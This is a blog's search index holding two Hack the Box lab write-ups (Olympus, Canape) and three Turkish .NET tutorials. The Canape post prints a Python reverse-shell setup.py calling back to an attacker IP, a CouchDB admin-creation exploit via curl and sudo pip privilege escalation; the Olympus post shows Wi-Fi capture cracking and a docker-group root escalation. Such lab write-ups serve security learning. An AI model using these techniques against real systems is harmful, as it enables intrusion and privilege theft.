<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[{Hack the Box} \\ Olympus Write-Up]]></title>
      <url>/hack-the-box-olympus/</url>
      <content type="text"><![CDATA[Hi everyone,In this article I’ll show you guys how I pwned Olympus machine on Hack the Box. Lets start..EnumerationFirst thing we need to do is enumerating ports. I will be using masscan for quicly enumerating all ports.I recommend you to use this awesome tool.root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# masscan -p1-65535 10.10.10.83 --rate=200 -e tun0Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2018-09-20 16:08:21 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65535 ports/host]Discovered open port 2222/tcp on 10.10.10.83Discovered open port 53/tcp on 10.10.10.83Discovered open port 80/tcp on 10.10.10.83There are some ports opened. Lets run nmap for more information.root@89e502fff05a:~/pentest/hack-the-box/machines/olympus# nmap -sS -sV -sC -p53,80,2222 -o nmap.txt 10.10.10.83Nmap scan report for 10.10.10.83Host is up (0.074s latency).PORT     STATE SERVICE VERSION53/tcp   open  domain  (unknown banner: Bind)| dns-nsid:|_  bind.version: Bind| fingerprint-strings:|   DNSVersionBindReqTCP:|     version|     bind|_    Bind80/tcp   open  http    Apache httpd|_http-title: Crete island - Olympus HTB2222/tcp open  ssh     (protocol 2.0)| fingerprint-strings:|   NULL:|_    SSH-2.0-City of olympia| ssh-hostkey:|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :Apache is running in port 80. We have a web page. Lets check it first.There is a picture as background of body. I looked the source code of the page and nothing is usefull. So I thought maybe thats a steganography challenge ? Downloaded that image and run steghide and binwalk on it. And I got nothing. And I decided to take a look at the server response, maybe I can find something.Yeah. Thats realy interesting. Xdebug is a PHP extension for debugging.That header also tells us the version of xdebug. I searched on google and I saw that version has a vulnerabilty.Exploitation (stage-one)I wrote a simple script that drops me a reverse-shell.Enumeration from the insideI am www-data now. Thats good but I realized that box is actually a docker container. That means we are not inside the real box. Anyway, I found a zeus username in /etc/passwd file. I looked the /home/zeus dir. I saw airgeddon folder, here:drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 .drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..-rw-r--r-- 1 zeus zeus    264 Apr  8 00:58 .editorconfigdrwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .git-rw-r--r-- 1 zeus zeus    230 Apr  8 00:58 .gitattributesdrwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 .github-rw-r--r-- 1 zeus zeus     89 Apr  8 00:58 .gitignore-rw-r--r-- 1 zeus zeus  15855 Apr  8 00:58 CHANGELOG.md-rw-r--r-- 1 zeus zeus   3228 Apr  8 00:58 CODE_OF_CONDUCT.md-rw-r--r-- 1 zeus zeus   6358 Apr  8 00:58 CONTRIBUTING.md-rw-r--r-- 1 zeus zeus   3283 Apr  8 00:58 Dockerfile-rw-r--r-- 1 zeus zeus  34940 Apr  8 00:58 LICENSE.md-rw-r--r-- 1 zeus zeus   4425 Apr  8 00:58 README.md-rw-r--r-- 1 zeus zeus 297711 Apr  8 00:58 airgeddon.shdrwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 binariesdrwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 captureddrwxr-xr-x 1 zeus zeus   4096 Apr  8 00:59 imgs-rw-r--r-- 1 zeus zeus  16315 Apr  8 00:58 known_pins.db-rw-r--r-- 1 zeus zeus 685345 Apr  8 00:58 language_strings.sh-rw-r--r-- 1 zeus zeus     33 Apr  8 00:58 pindb_checksum.txtThat captured folder is interesting. I looked inside and:drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txtpapyrus.txtCaptured while flying. I'll banish him to Olympia - ZeusThat message maybe could help later.captured.capI copied that file using netcat. When you transfering something always make sure the file is not broken, check the md5sum.I dedided to crack the file.aircrack-ng captured.cap -w ~/pentest/wordlist/rockyou.txtSSID: Too_cl0se_to_th3_Sun noted.After 20-30 mins later aircrack-ng cracked the file.The password is flightoficarusStage TwoI tried to connect to the machine using ssh with username zeus and passwords I found, but didn’t worked.Than I thought, I know I am in a docker container. There isn’t another user on that container.There must be another container or actual box itself. So I tried with username icarus and passwords I found. It worked.icarus is the right username, and the password is Too_cl0se_to_th3_Sunssh icarus@10.10.10.83 -p 2222EnumerationFound something interesting again. ctfolympus.htb Lets add this domain in our /etc/hosts file.I already checked that dns service I found earlier with nmap. But I didn’t find anything. Lets check again.root@89e502fff05a:~# dig axfr @10.10.10.83 ctfolympus.htb; &lt;&lt;&gt;&gt; DiG 9.11.4-4-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.83 ctfolympus.htb; (1 server found);; global options: +cmdctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"ctfolympus.htb.		86400	IN	A	192.168.0.120ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.ctfolympus.htb.		86400	IN	MX	10 mail.ctfolympus.htb.crete.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.hades.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.mail.ctfolympus.htb.	86400	IN	A	192.168.0.120ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120rhodes.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.RhodesColossus.ctfolympus.htb. 86400 IN	TXT	"Here lies the great Colossus of Rhodes"www.ctfolympus.htb.	86400	IN	CNAME	ctfolympus.htb.ctfolympus.htb.		86400	IN	SOA	ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400;; Query time: 79 msec;; SERVER: 10.10.10.83#53(10.10.10.83);; WHEN: Fri Sep 21 15:06:00 UTC 2018;; XFR size: 15 records (messages 1, bytes 475)This message looks interesting.."prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"As I could understand there is another place to go. 3456, 8234, 62431 these numbers also weird. prometheus must be a username, St34l_th3_F1re! must be password. I tried with ssh again but didn’t worked. I was stucked here. But my friend Kunal told me about port-knocking.I searched on google and found these great articles.  https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu  https://www.bgasecurity.com/2014/05/port-knocking-yontemi-ile-portlar/Basicly the port 22 is opened but hidden. We can’t access directly. But if we knock specific ports in a particular order, knockd service catch that sequence and allow us to connect.Doen’t matter if that ports closed or not.Stage threeapt install knockdroot@89e502fff05a:~# knock ctfolympus.htb 3456 8234 62431 &amp;&amp; ssh prometheus@ctfolympus.htbprometheus@ctfolympus.htb's password: St34l_th3_F1re!In the home folder of prometheus there is a message from gods.That message I think useless.I’m in docker users group. Thats important.Lets have a look at docker images and containers.Getting rootI want root flag, right ?Docker allow us to share our data between our machine and docker containers. So all I need to do is bind the /root partition and I can read what I want..docker run --rm -it -v /root:/pwned olympia /bin/bashIt will create new container and execute the /bin/bash for us.–rm flag means delete the container when we exit.Or we could use like this for just grab the flag..docker run --rm -it -v /root:/pwned olympia /bin/bash -c "/bin/cat /pwned/root.txt"Almost forgot, I wanna show you guys how knockd daemon configured on this machine.Check this.Thats it for Olympus. I learned a few things from this machine. If you have a question or something you can leave a comment.See you guys later.]]></content>
      <categories>
        
          <category> write-up </category>
        
          <category> hackthebox </category>
        
      </categories>
      <tags>
        
          <tag> writeup </tag>
        
          <tag> olympus </tag>
        
          <tag> pentest </tag>
        
          <tag> hackthebox </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[{Hack the Box} \\ Canape Write-Up]]></title>
      <url>/hack-the-box-canape/</url>
      <content type="text"><![CDATA[Hi everyone,In this article I will be doing Canape machine on Hack the Box. Lets start..EnumerationFirst we need to know which ports are open. So lets start with port-knockingroot@89e502fff05a:~/pentest/hack-the-box/machines/canape# nmap -sS -sC -sV 10.10.10.70 -o scan-01.txtNmap scan report for 10.10.10.70Host is up (0.076s latency).Not shown: 999 filtered portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))| http-git:|   10.10.10.70:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file 'description' to name the...|     Last commit message: final # Please enter the commit message for your changes. Li...|     Remotes:|_      http://git.canape.htb/simpsons.git|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Simpsons Fan Site|_http-trane-info: Problem with XML parsing of /evox/aboutAs you can see there is a git repo, probably contains source code of the app.I wanna look at that web page first.Hmm, CouchDB looks like interesting. At this point I examined all pages on this site. And decided to enumerate the directories on this site, so I ran gobuster, but didn’t find anything. Because if I go to the page which there isn’t on the site, the app gives me 200 ok and shows me a weird random code. Must has a custom error handler.So I decided to take a look at that git repo I found earlier.Edited my /etc/hosts file to access the repo.(By the way, ozzy is my docker container)root@89e502fff05a:~/pentest/hack-the-box/machines/canape# git clone http://git.canape.htb/simpsons.gitCloning into 'simpsons'...remote: Counting objects: 49, done.remote: Compressing objects: 100% (47/47), done.remote: Total 49 (delta 18), reused 0 (delta 0)Unpacking objects: 100% (49/49), done.There it is, __init__.pyOther files are not important. Just some html and js files.Now we can examine the source code of the app. I’m using Visual Studio Code as my text editor.CouchDB running on http://localhost:5984/ noted. Also there is a custom error handler I talked about it. But the important one is cPickle. Its a built-in python module that allows you to serialize &amp; deserialize objects.Here is the full gist of __init__.pyhttps://git.io/fAiTBInside of the check function item = cPickle.loads(data) This line will help us to get RCE (Remote Code Execution).If we post something to http://canape.htb/submit with character and quote parameters that function will create a file in /tmp folder. And write our parameters in that file.outfile = write(char + quote)And than if we post to http://canape.htb/check with parameter id that function will load our data.If our data contains malicious code, also will be executed.Now we can build our payload. But first, character parameter must contain the one of items on the whitelist, don’t forget that.Otherwise we will get 500 Internet Server Error.ExploitationWHITELIST = [ "homer", "marge", "bart", "lisa", "maggie", "moe", "carl", "krusty" ]I wrote a simple script to test it if it works..So I added “homer” at the end of my payload. I added at the begining before but when I tried to execute my test script, it didn’t worked.Ran it and boooom, the command was executed.Than I build a little script to get a reverse-shell.Here is the gist link. https://git.io/fAiTUNow we are in as www-data user. We can start to enumerate from the inside.But first lets quickly upgrade our shell.  CTRL + Zstty raw -echofgFurther EnumerationFirst I want it to check couchdb. I didn’t know how to query that database, so I searched on google.www-data@canape:/$ curl http://localhost:5984{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}www-data@canape:/$ curl http://localhost:5984/_users/_all_docs{"error":"unauthorized","reason":"You are not a server admin."}www-data@canape:/$ curl http://localhost:5984/_all_dbs["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]www-data@canape:/$ curl http://localhost:5984/passwords{"error":"unauthorized","reason":"You are not authorized to access this db."}  Tip: You can prettify that values in vscode by pressing CTRL + K FHmmm thats interesting. There is passwords table, probably with usefull content.I wanna check it out, but it gives me an error that says I’m not authorized.At this point, I know the version of couchdb, so I searched for common exploits and vulnerabilities.And I came across with these:  https://www.exploit-db.com/exploits/44498/https://serverfault.com/questions/742184/couchdb-user-creation-without-authentication-standard-behaviorwww-data@canape:/$ curl -X PUT "http://localhost:5984/_users/org.couchdb.user:pwn" -d '{ "type": "user", "name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'&lt;"name": "pwn", "roles": ["_admin"], "roles": [], "password": "pwn" }'{"ok":true,"id":"org.couchdb.user:pwn","rev":"1-2189e39effa7061778a422d5e9318d21"}Yea, that worked, we added an admin user with name and password pwn .www-data@canape:/$ curl http://pwn:pwn@localhost:5984/_users/_all_docs{"total_rows":3,"offset":0,"rows":[{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},{"id":"org.couchdb.user:guest","key":"org.couchdb.user:guest","value":{"rev":"1-76778427e593a7e4a68832b308ed4a5e"}},{"id":"org.couchdb.user:pwn","key":"org.couchdb.user:pwn","value":{"rev":"1-2189e39effa7061778a422d5e9318d21"}}]}Lets have a look at passwords database:www-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/_all_docs{"total_rows":4,"offset":0,"rows":[{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}]}At this point, I spent my time to understand that values. And I spent to much time to figure it out.Searched on google how to read those.Than I understand, I didn’t know that base64 values are the actual id values like sql table id’s.  Tip: http://docs.couchdb.org/en/stable/api/index.htmlwww-data@canape:/$ curl http://pwn:pwn@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}We got a password.Lets cat the /etc/passwd for enumerating users on system....homer:x:1000:1000:homer,,,:/home/homer:/bin/bash...Maybe that password we found belongs to homer ?www-data@canape:/$ su homerPassword:homer@canape:/$We got homer now. user.txt is in this home folder.Privilege EscalationFirst lets check sudo -lhomer@canape:~$ sudo -l[sudo] password for homer:Matching Defaults entries for homer on canape:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser homer may run the following commands on canape:    (root) /usr/bin/pip install *We can install pip packages as root, great.I can grab the flag easily, let me show you.homer@canape:~/.root$ sudo pip install -r /root/root.txtThe directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.Collecting xxxxxxxxxxxxxxxxxxxxxxx (from -r /root/root.txt (line 1))Why it worked ? -r flag means take all requipments from given txt file. And I gave it root.txt :smiling_imp: Then pip want it to collect the first line and boooom. (first-line was the flag)And this is other technique for reverse-shell. Create empty folder and name it this little script as setup.py and run sudo pip install .import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("10.10.14.163",3141))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])homer@canape:~/.root$ sudo pip install .The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.Processing /home/homer/.rootListening machine:root@89e502fff05a:~/pentest/hack-the-box/machines/canape# nc -lvnp 3141listening on [any] 3141 ...connect to [10.10.14.163] from (UNKNOWN) [10.10.10.70] 39504# iduid=0(root) gid=0(root) groups=0(root)Done, now we are root.It think it was an easy box, but getting the user is a bit hard. Because most of us didn’t knew about couchdb.I used pouchdb and couchdb together one of my projects but even I didn’t knew how to query it using http api ?!This box, pushes us to learn some.See you guys later.]]></content>
      <categories>
        
          <category> write-up </category>
        
          <category> hackthebox </category>
        
      </categories>
      <tags>
        
          <tag> writeup </tag>
        
          <tag> pentest </tag>
        
          <tag> hackthebox </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[.Net MongoDB Kullanımı]]></title>
      <url>/mongodb-in-dotnet/</url>
      <content type="text"><![CDATA[MongoDBMongoDB, NoSQL kavramıyla ortaya çıkmış document-oriented veri modelini kullanan açık kaynak bir veritabanıdır. Bu yazımda .Net projelerinizde nasıl MongoDB kullanabileceğinizi anlatacağım.  Bu Makalemde MongoDB kurulumuna değinmeyeceğim, kurduğunuzu varsayarak anlatım yapacağım. Bu Makale bulunan kodların proje halini buradan indirebilirsiniz.MongoDB vs SQLAşağıda bazı SQL terimlerinin MongoDB karşılıklarını görüyorsunuz.             SQL      MongoDB                  database      database              table      collection              column      field              row      document      MongoDB Driver kurulumuMongoDB bir çok programlama dilini destekler ve bunlar için ayrı driverları vardır. Bu driverlar uygulamamızın MongoDB ile iletişim kurabilmesini sağlar. Bu yüzden .Net için olan driverı biz NuGet aracılığı ile projemize dahil edeceğiz.Package Manager Console ‘a aşağıdaki kodu yazıp kurabilirsiniz.  Install-Package MongoDB.Driver -Version 2.4.4Ya da projenize sağ tıklayıp Manage NuGet Packages seçeneğinden MongoDB.Driver yazıp arayarak çıkan pakedi kurabilirsiniz. Ben bu makaleyi yazarken kullandığım sürüm 2.4.4 sürümü. Kodlar sürümlere göre farklılık gösterebilir.Repository pattern ile örnek uygulamaBurada entity sınıfımızı projemize eklediğimiz driverdaki attributeleri kullanarak oluşturuyoruz. Id alanlarını [BsonId] diğer alanları ise [BsonElement(..)] attribute ile işaretliyoruz. Id lerimizin tipi ise dikkat ederseniz ObjectId türünden. Bu şekilde field larımızı attribute ler yardımıyla isimlendirmiş olduk. Asenkron bi şekilde repository interface ‘imizi de CRUD işlemlerimiz için hazırlıyoruz.. Context sınıfımızı da yukarıdaki gibi tasarlıyoruz.Burada dikkatinizi çeken IMongoDatabase interface ‘i bizim veritabanımızı temsil ediyor. MongoUrl sınıfını ise bizim connection string ‘imiz üzerinden veritabanı adını alabilmemiz için kullandık.  MongoRepository adında generic bir abstract repository sınıfımızı yukarıdaki gibi hazırlıyoruz. IRepository&lt;T&gt; interface ‘imizi de giydiriyoruz sınıfımıza. IMongoCollection&lt;T&gt; Başta gösterdiğim tablodaki gibi collection, SQL karşılığı ile bizim tablolarımızdır diyebiliriz. Burada bir de AddNewAsync methodumuzu görüyorsunuz. Collection property ‘mizin InsertOneAsync methodu ile veritabanımıza ekleme yapıyoruz.  Burada açıkçası pek fazla açıklama yapmaya gerek olmadığını düşünüyorum. MongoRespository sınıfımızın diğer methodları buradakiler. Sorgulama yaparken (GetByX.. methodlarımızda) filtreleme yapabilmek için Builder sınıfından yararlanıyoruz. Ya da linq methodları ile de yapabilirsiniz bunu tabii.Burada update işleminde linq kullandık. UserRepository ‘mizi de oluşturduk. _dataContext.Database.GetCollection&lt;User&gt;("users"); Burada tırnak içinde “users” yazdığım yere siz tabiiki kendi koleksiyonunuza vermek istediğiniz adı gireceksiniz.Buraya kadar tamam. Bir de pratik olsun diye UnitOfWork yapalım hadi.   Ve aşağıda da oluşturduğumuz sınıflarımızı kullanarak CRUD işlemlerimizi gerçekleştirdiğimiz bir test sınıfımız var.Bir sonraki yazıda görüşmek üzere. ]]></content>
      <categories>
        
          <category> database </category>
        
          <category> mongodb </category>
        
          <category> repository-pattern </category>
        
      </categories>
      <tags>
        
          <tag> repositorypattern </tag>
        
          <tag> mongodb </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[ServiceStack ile web servis geliştirme]]></title>
      <url>/service-stack/</url>
      <content type="text"><![CDATA[Nedir bu ServiceStack ?WCF ve Web API ye alternatif olarak cross-platform olarak kullanabileceğimiz open-source bir web service framework. Eğer .Net Framework çatısı altında çalışıyorsanız WCF kullanabilirsiniz fakat web servislerinizi Windows dışındaki platformlara da dağıtmak istiyorsanız ServiceStack ideal bir seçenektir.  WCF client ve server arasındaki iletişimi sağlayabilmek için data contracts (veri sözleşmeleri) kullanır.ServiceStack bu bakımdan biraz da WCF ‘e benzer.Daha fazla bilgi için: servicestack.netNeden ServiceStack ?  Kolay olması  Hızlı olması  Bizi karmaşık XML configrasyonlarıyla uğraştırmaması  En önemlisi de cross-platform bir hizmet verebilmemizi sağlıyor olmasıgibi avantajları olduğu için tercih edilir.ServiceStack Any, GET, POST, DELETE, PUT gibi eylemleri destekler. Any hem GET hem de POST istekleri tarafından çağrılabileceği anlamına gelir.  ServiceStack web servisimizi RESTful web servise dönüştürmek için Web request tanımlarken sınıfımızı [Route(...)] attribute ile uygun şekilde işaretlememiz yeterli.Ufak bir örnek ile gösterelim. NuGet package manager ‘da  ServiceStack framework ‘unu buluyoruz ve projemize ekliyoruz.Burada basitçe Name parametresi alan bir HelloService oluşturduk. Geriye gördüğünüz üzere "Hello, $Name" şeklinde parametreyi döndürüyor. HelloRequest sınıfına neden IReturn&lt;HelloResponse&gt; arayüzünü giydirdiğimizi birazdan açıklayacağım.AppHost ‘umuzu AppSelfHostBase sınıfından türetiyoruz. Ve constructor ‘ında ilgili parametreleri veriyoruz.Hostumuzu bu şekilde oluşturup başlatıyoruz.Test projemize aynı şekilde NuGet package manager ‘dan bu kez ServiceStack.HttpClient referansını ekliyoruz.HelloRequest sınıfına IReturn&lt;HelloResponse&gt; arayüzünü giydirmeseydik kodda yorum satırı olarak geçen:  string response = client.Get(new HelloRequest { Name = "SERKAN" }).Result; şeklinde bir kullanım yapamazdık.  Çünki client.Get() fonksiyonun aldığı parametrelerden biri IRequest&lt;T&gt;. Bu yazımızda buraya kadar. Detaylı dokümantasyon için docs.servicestack.net adresine göz atabilirsin. ]]></content>
      <categories>
        
          <category> web-services </category>
        
          <category> rest-api </category>
        
      </categories>
      <tags>
        
          <tag> servicestack webservices </tag>
        
          <tag> restfullservice </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Repository pattern ve tipik hatalar]]></title>
      <url>/repository-pattern/</url>
      <content type="text"><![CDATA[Repository pattern bir soyutlamadır. Amaç karışıklığı azaltarak kodun geri kalanını kalıcı kılmaktır.Faydaları !  Unit testler yazmayı kolaylaştırır.  Kodun bakım ve yönetimi kolaylaşır.  CRUD (Create, Read, Update, Delete) işlemlerimizi hızlıca gerçekleştirebiliriz.    Nasıl repository oluşturulur ?    Repository pattern ‘ı doğru bir şekilde uygulayabilmek için izlemeniz gereken tek bir kural var.          Repository sınıfınıza, ihtiyaç duyana kadar hiç bir şey eklemeyin !      Geliştiricilerin bir çoğu generic bir repository oluturup, içine ihtiyaç duyabilecekleri tüm fonksiyonları da ekleyerek bunu bir base class olarak kullanırlar. Bu yanlıştır.Unit of WorkUnit of work design pattern ‘ı genellikle repository pattern ile birlikte kullanılır.Adından da anlaşılacağı gibi veritabanı işlemlerimizi tek bir kanaldan yürütmemizi sağlar. Yapılan işlemlerin veritabanına toplu halde kaydedilmesi, herhangi bir hata olması durumunda rollback (geri alınması) ya da transaction iptali gibi işlemleri sağlayabiliriz.UygulamaKüçük bir örnek ile başlayalım.Biraz da özelleştirelim.Burada görüldüğü gibi sadece ihtiyacınız olan fonksiyonları oluşturun.Entity FrameworkBase class (taban sınıf)Oluşturduğumuz taban sınıfımızı daha sonra repository sınıfımıza implement ediyoruz.return ederken ToList(), FirstOrDefault() vb. çağrılıncaya kadar sorgu veritabanında yürütülemez.Kullanmayı unutmayın !Entity Framework için Unit of WorkFinalTipik hatalarLinq methodlarınızı dışarı açmayınEğer linq methodlarınızı açığa vurursanız yani dışarıya açarsanız (sızıntı) repository pattern ‘ı amacına uygun kullanamamış olursunuz. Sızıntılı bir soyutlama elde edersiniz.Genellikle IQueryable&lt;T&gt; ile.Repository pattern yazının en başında da dediğimiz gibi soyutlamaya (abstraction) dayanır.Bunu yapmayın:  Bu repository sınıfları hiç bir amaca hizmet etmiyor.Lazy-loading öğreninEğer bilmiyorsanız Google]]></content>
      <categories>
        
          <category> design-patterns </category>
        
          <category> .net </category>
        
          <category> repository-pattern </category>
        
          <category> unit-of-work </category>
        
      </categories>
      <tags>
        
          <tag> repositorypattern </tag>
        
          <tag> entityframework </tag>
        
          <tag> unitofwork </tag>
        
          <tag> designpatterns </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
